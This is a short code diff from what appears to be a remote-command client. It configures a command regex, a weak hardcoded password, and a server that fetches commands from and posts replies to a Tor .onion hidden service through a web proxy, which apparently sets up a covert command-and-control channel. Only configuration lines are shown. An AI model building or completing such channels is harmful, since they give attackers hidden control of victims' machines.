@@ -77,11 +77,9 @@ regexp="^key=(\w{1,});cmd=(\w{1,})$"
 passwd="123456"
 
 
-#server="127.0.0.1"
 server="tor-proxy.net"
 hidden_service="o3mco5aw544ls6du.onion"
 port="80"
-#request_command_resource="/proxy/express/browse.php?u=http%3A%2F%2F"+hidden_service+"/get.html"
 request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
 response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
 
